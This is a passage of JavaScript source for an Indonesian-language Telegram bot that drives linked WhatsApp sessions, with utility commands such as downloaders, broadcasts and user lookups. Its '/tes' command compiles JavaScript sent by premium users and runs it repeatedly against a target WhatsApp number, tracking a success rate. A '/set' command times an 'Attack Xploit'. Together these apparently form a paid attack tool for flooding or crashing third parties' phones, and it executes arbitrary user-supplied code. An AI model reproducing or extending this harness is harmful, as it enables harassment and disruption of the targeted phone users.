  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});


bot.onText(/^\/restar$/, async (msg) => {
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;      
    try {
        const processingMsg = await bot.sendMessage(chatId, "<blockquote><b>Proses restart sesi....</b></blockquote>", { reply_to_message_id: msg.message_id, parse_mode: "HTML" });
        await initializeWhatsAppConnections();
        await bot.editMessageText("<blockquote><b>Sukses restart sesi</b></blockquote>", {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, error);
    }
});

// -- ( Case Tes Function ) -- \\
bot.onText(/\/tes (\d+),(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const loopCount = parseInt(match[2]);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  if (shouldIgnoreMessage(msg)) return;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk premium users!");
  }

  const cd = checkCooldown(senderId);
  if (cd > 0) {
    const minutes = Math.ceil(cd / 60);
    return bot.sendMessage(chatId, `⏳ Cooldown: ${minutes} menit lagi`, { parse_mode: "Markdown" });
  }

  if (sessions.size === 0 || !sock) {
    return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung. Gunakan /pairing dulu.");
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Reply pesan ini ke file JavaScript atau kode function yang ingin di-test!");
  }

  const repliedMsg = msg.reply_to_message;

  try {
    let testFunction;

    if (repliedMsg.document && repliedMsg.document.file_name.endsWith('.js')) {
      const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
      const response = await fetch(fileLink);
      const fileContent = await response.text();
      
      const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return bot.sendMessage(chatId, "❌ File JavaScript tidak mengandung async function yang valid!");
      }

      testFunction = new Function(`return ${fileContent}`)(); // mengganti eval dengan Function
    } else if (repliedMsg.text) {
      const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return bot.sendMessage(chatId, "❌ Kode tidak mengandung async function yang valid!");
      }

      testFunction = new Function(`return ${repliedMsg.text}`)(); // mengganti eval dengan Function
    } else {
      return bot.sendMessage(chatId, "❌ Format tidak didukung! Kirim file .js atau kode function.");
    }

    if (typeof testFunction !== 'function') {
      return bot.sendMessage(chatId, "❌ Gagal memuat function!");
    }

    const progressMsg = await bot.sendMessage(chatId, `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`);

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(sock, target);     
        successCount++;
        
        if (i % Math.ceil(loopCount / 10) === 0) {
          const progress = Math.round((i / loopCount) * 100);
          await bot.editMessageText(`🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: █${'█'.repeat(progress / 10)}${'░'.repeat(10 - progress / 10)} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`, {
            chat_id: chatId,
            message_id: progressMsg.message_id
          });
        }
        
        await sleep(1000);
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
        console.error(`Error di loop ${i + 1}:`, err);
      }
    }

    let resultText = `📊 **TEST RESULTS**\n\n`;
    resultText += `🎯 Target: ${formattedNumber}\n`;
    resultText += `🔄 Total Loop: ${loopCount}x\n`;
    resultText += `✅ Success: ${successCount}\n`;
    resultText += `❌ Error: ${errorCount}\n`;
    resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

    if (errors.length > 0) {
      resultText += `🚨 **ERROR DETAILS:**\n`;
      resultText += errors.slice(0, 5).join('\n');
      if (errors.length > 5) {
        resultText += `\n... dan ${errors.length - 5} error lainnya`;
      }
    }

    await bot.editMessageText(resultText, {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error saat testing: ${error.message}`);
  }
});

function isAdminOrOwner(member) {
  return member.status === 'administrator' || member.status === 'creator';
}
function isOwnerGc(member) {
  return member.status === 'creator';
}

bot.onText(/\/tiktok (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const tiktokUrl = match[1];
  
    if (!match || !match[1]) {
  return bot.sendMessage(chatId, 'Salah /tiktok url');
  }
  
  try {
    const response = await axios.get(`https://apidl.asepharyana.cloud/api/downloader/ttdl?url=${encodeURIComponent(tiktokUrl)}`);
    const result = response.data;

    if (result.success && result.data?.data?.play) {
      const videoUrl = result.data.data.play;
      const caption = result.data.data.title || '✅ Berikut videonya:';

      await bot.sendVideo(chatId, videoUrl, { caption });
    } else {
      bot.sendMessage(chatId, '❌ Gagal mengambil video. Pastikan link valid dan coba lagi.');
    }
  } catch (error) {
    console.error(error.message);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menghubungi API.');
  }
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!config.OWNER_ID.includes(msg.from.id)) {
        return resricted(msg.from.id);
    }
    try {
        let succes = 0;
        let failed = 0;
        const message = match[1];
        const users = JSON.parse(fs.readFileSync(userDB));
        const pesan = `<pre>𝗜𝗻𝗶 𝗔𝗱𝗮𝗹𝗮𝗵 𝗣𝗲𝘀𝗮𝗻 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁</pre>\n${message}`;
        
        for (const user of users) {
            try {
                await bot.sendMessage(user.id, pesan, {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "Owner",
                                    url: "t.me/susudancow15"             
                                }
                            ]
                        ]
                    }
                });
                console.log(`Terkirim ke ${user.id}`);
                succes++;
            } catch (error) {
                console.error(`Gagal mengirim ke ${user.id}:`, error);
                failed++;
            }
        }
        
        await bot.sendMessage(msg.chat.id, `Broadcast dikirim ke ${users.length} user\nSucces: ${succes}\nError: ${failed}`);
    } catch (error) {
        console.error('Error utama:', error);
        bot.sendMessage(msg.chat.id, `Terjadi error saat broadcast: ${error.message}`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const message = match[1];
  const users = JSON.parse(fs.readFileSync(userDB));
  
  if (!message) {
  return bot.sendMessage(msg.chat.id, `/cekidch username_channel`, { 
  reply_to_message_id: msg.message_id
  });
  }
  const username = message.replace('@', '');
  const url = `https://api.telegram.org/bot${config.BOT_TOKEN}/getChat?chat_id=@${username}`;
  try {
  const response = await axios.get(url);
  const json = JSON.stringify(response.data, null, 2); 
  const text = `*Raw API Response:*\n\`\`\`json\n${json}\n\`\`\``;
  bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id
    });
  } catch (err) {
    const errorJson = JSON.stringify(err.response?.data || { error: err.message }, null, 2);
    console.log(errorJson);
    bot.sendMessage(msg.chat.id, `\`\`\`${errorJson}\`\`\``, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id
    });
    }
});

bot.onText(/\/info(?:\s+@?(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const sender = msg.from;
    const replyTo = msg.reply_to_message;
    const mentionedUsername = match[1]; 

    const senderName = sender.first_name + (sender.last_name ? ` ${sender.last_name}` : '');
    const senderMention = sender.username ? `@${sender.username}` : senderName;

 
    if (replyTo?.from) {
        const user = replyTo.from;
        const fullName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
        return bot.sendMessage(chatId, `
╭━━「 INFO PENGGUNA 」⬣
×͜× Username: ${user.username ? `@${user.username}` : 'Tidak ada'}
×͜× ID: \`${user.id}\`
×͜× Nama: \`${fullName}\`
╰────────────────⬣
*Diminta oleh* ${senderMention}
`, {
            parse_mode: 'Markdown',
            reply_to_message_id: msg.message_id,
        });
    }
    if (mentionedUsername) {
        try {
            const memberList = await bot.getChatAdministrators(chatId); 
            const botMember = memberList.find(m => m.user.id === bot.id);
            if (!botMember) throw new Error("Bot bukan admin");

            
            const chat = await bot.getChat(chatId);
            const admins = await bot.getChatAdministrators(chatId);

         
            const matchUser = admins.find(admin =>
                admin.user.username &&
                admin.user.username.toLowerCase() === mentionedUsername.toLowerCase()
            );

            if (!matchUser) {
                return bot.sendMessage(chatId, `⚠️ Tidak dapat menemukan pengguna @${mentionedUsername} di grup ini. Pastikan mereka masih anggota.`, {
                    reply_to_message_id: msg.message_id,
                });
            }

            const user = matchUser.user;
            const fullName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');

            return bot.sendMessage(chatId, `
╭━━「 INFO PENGGUNA 」⬣
×͜× Username: @${mentionedUsername}
×͜× ID: \`${user.id}\`
×͜× Nama: \`${fullName}\`
╰────────────────⬣
*Diminta oleh* ${senderMention}
`, {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.message_id,
            });

        } catch (err) {
            console.error("❌ Gagal ambil info dengan getChatMember:", err.message);
            return bot.sendMessage(chatId, `⚠️ Gagal mendapatkan informasi @${mentionedUsername}. Pastikan bot adalah admin dan user masih dalam grup.`, {
                reply_to_message_id: msg.message_id,
            });
        }
    }
    return bot.sendMessage(chatId, `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${sender.username ? `@${sender.username}` : 'Tidak ada'}
×͜× ID: \`${sender.id}\`
×͜× Nama: \`${senderName}\`
╰────────────────⬣
`, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id,
    });
}); 

bot.onText(/^\/toanime(?:\s+([\s\S]+))?/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()
  const pengirim = msg.from
  const urlArg = match[1]?.trim()

  let imageUrl = urlArg || null

  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id
    const fileLink = await bot.getFileLink(fileId)
    imageUrl = fileLink
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /toanime")
  }

  const status = await bot.sendMessage(chatId, "⌭ Memproses gambar ke mode Anime...")

  try {
    if (shouldIgnoreMessage(msg)) return
    if (senderId !== MASTER_ADMIN_ID && !(Array.isArray(premiumUsers) && premiumUsers.some(u => (u.id === senderId || u.id === msg.chat.id) && new Date(u.expiresAt) > new Date()))) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖?`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
        }
      })
    }

    const res = await fetch(`https://api.nekolabs.web.id/style-changer/anime?imageUrl=${encodeURIComponent(imageUrl)}`, {
      method: "GET",
      headers: { accept: "*/*" }
    })
    const data = await res.json()
    const hasil = data.result || null

    if (!hasil) {
      return bot.editMessageText("⎈ Gagal memproses gambar. Pastikan URL atau foto valid.", {
        chat_id: chatId,
        message_id: status.message_id
      })
    }

    await bot.deleteMessage(chatId, status.message_id)

    await bot.sendPhoto(chatId, hasil, {
      caption: `\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙊𝙏𝘼𝙓 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴏᴛᴀx
\`\`\``,
      parse_mode: "Markdown"
    })
  } catch (e) {
    await bot.editMessageText("⎈ Terjadi kesalahan saat memproses gambar.", {
      chat_id: chatId,
      message_id: status.message_id
    })
  }
})

bot.onText(/\/set (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
   if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "𝙇𝙪 𝙎𝙞𝙖𝙥𝙖 𝙈𝙚𝙠!? 𝙂𝙖 𝘼𝙙𝙖 𝙃𝙖𝙠 𝘽𝙪𝙖𝙩 𝙈𝙖𝙠𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙄𝙣𝙞×͜×");
  }
  const duration = parseInt(match[1]);
  if (isNaN(duration) || duration < 30) return bot.sendMessage(msg.chat.id, '❌ Minimal durasi Attack Xploit 30 detik.');
  startGlobalTimeout(duration * 1000);
  bot.sendMessage(msg.chat.id, `⏱️Attack Xploit otomatis akan berhenti dalam ${duration} detik.`);
});


bot.onText(/^\/?open$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "Mana Filenya Dongo!!"
    );
  }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;

  try {
    const fileLink = await bot.getFileLink(fileId);
    const res = await fetch(fileLink);
    const content = await res.text();

    const preview =
      content.length > 3800
        ? content.substring(0, 3800) + "\n\n... (isi file terpotong)"
        : content;

    const text = `╭─⭓ *Isi File* ────
│ 📁 *${fileName}*
╰───────────────⭓

\`\`\`TypeScript
${preview}
\`\`\`
`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
  }
});


bot.onText(/^\/cekid(\s|$)$/, async (msg) => {
  const user = msg.from;
  const chatId = msg.chat.id;
  const firstName = user.first_name || '';
  const lastName = user.last_name || '';
  const userId = user.id;
  if (shouldIgnoreMessage(msg)) return;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `\`\`\`👤\nUSERNAME : ${user.username ? '@' + user.username : 'Tidak ada'}\nID : ${userId}\`\`\``;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch {
    bot.sendMessage(chatId, `ID : \`${userId}\``, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
  }
});


const png = "./dapaa_For_You/images//data/dapaa.png";


function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(config.OWNER, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
}
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});
